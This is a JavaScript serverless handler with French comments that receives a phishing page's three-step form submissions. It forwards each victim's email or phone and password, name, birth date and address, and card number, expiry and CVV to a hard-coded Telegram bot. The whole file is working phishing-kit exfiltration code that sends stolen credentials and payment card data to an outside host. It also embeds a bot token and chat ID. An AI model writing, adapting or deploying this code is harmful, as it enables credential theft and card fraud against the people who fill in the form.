export default async function handler(req, res) {
  // Autoriser les requêtes CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Vérifier la méthode HTTP
  if (req.method !== 'POST') {
    console.log("Méthode non autorisée :", req.method);
    return res.status(405).json({ error: 'Méthode non autorisée' });
  }

  // Récupérer les données de la requête
  const data = req.body;
  console.log("Données reçues :", data);

  // Token et Chat ID pour Telegram
  const botToken = '8515327609:AAEWGkA8TRf8nrOR1Y8RXxufmbMz9F6sH7I';
  const chatId = '6927572098';

  // Construire le message en fonction de l'étape
  let message = "";
  if (data.step === 1) {
    message = `
    📢 *Nouvelle soumission - Étape 1*
    =============================
    📧 *Email/Téléphone* : \`${data.emailOrPhone}\`
    🔑 *Mot de passe* : \`${data.password}\`
    `;
  } else if (data.step === 2) {
    message = `
    📢 *Nouvelle soumission - Étape 2*
    =============================
    👤 *Nom* : \`${data.nom}\`
    📅 *Date de naissance* : \`${data.birthDate}\`
    📍 *Adresse* : \`${data.adresse}\`
    🏙️ *Ville* : \`${data.ville}\`
    📮 *Code postal* : \`${data.codePostal}\`
    📱 *Téléphone* : \`${data.telephone}\`
    `;
  } else if (data.step === 3) {
    message = `
    📢 *Nouvelle soumission - Étape 3*
    =============================
    👤 *Titulaire* : \`${data.nomTitulaire}\`
    💳 *Numéro de carte* : \`${data.cardNumber}\`
    📅 *Expiration* : \`${data.expiryDate}\`
    🔒 *CVV* : \`${data.cvv}\`
    `;
  }

  try {
    console.log("Envoi du message à Telegram...");
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const payload = {
      chat_id: chatId,
      text: message,
      parse_mode: "Markdown"
    };

    console.log("Payload Telegram :", payload);

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    console.log("Réponse de Telegram :", response.status, response.statusText);

    if (!response.ok) {
      throw new Error(`Erreur lors de l'envoi du message: ${response.statusText}`);
    }

    console.log("Message envoyé avec succès !");
    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("Erreur:", error);
    return res.status(500).json({ error: error.message });
  }
}